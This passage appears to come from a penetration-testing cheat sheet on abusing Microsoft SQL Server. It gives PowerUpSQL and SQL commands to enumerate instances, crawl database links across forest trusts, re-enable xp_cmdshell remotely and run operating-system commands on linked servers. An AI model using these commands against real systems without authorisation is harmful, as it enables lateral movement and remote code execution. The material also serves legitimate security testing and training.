- Enumerate MSSQL Instances:
```powershell
Get-SQLInstanceDomain
```
- Check Accessibility as current user:
```powershell
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
- Gather Information about the instance:
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

# Abusing SQL Database Links
**WHAT IS THIS?**

A database link allows a SQL Server to access resources like other SQL Servers. If we have two linked SQL Servers we can execute stored procedures in them. Database links also work across a Forest Trust!

- Check for existing Database Links with `PowerUpSQL`:
```powershell
Get-SQLServerLink -Instance <SPN> -Verbose
```
- Check for existing Database Links with MSSQL Query:
```sql
select * from master..sysservers
```
- Then we can use queries to enumerate other links from the linked Database
- Manually:
```sql
select * from openquery("LinkedDatabase", 'select * from master..sysservers')
```
- With PowerUpSQL (will enumerate every link across Forests and Child Domain of the Forests):
```powershell
Get-SQLServerLinkCrawl -Instance <SPN> -Verbose
```
- Then we can execute commands on the machine where the SQL Service runs using `xp_cmdshell`.
- Or if it is disabled enable it:
```powershell
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
```
- Query execution:
```powershell
Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
```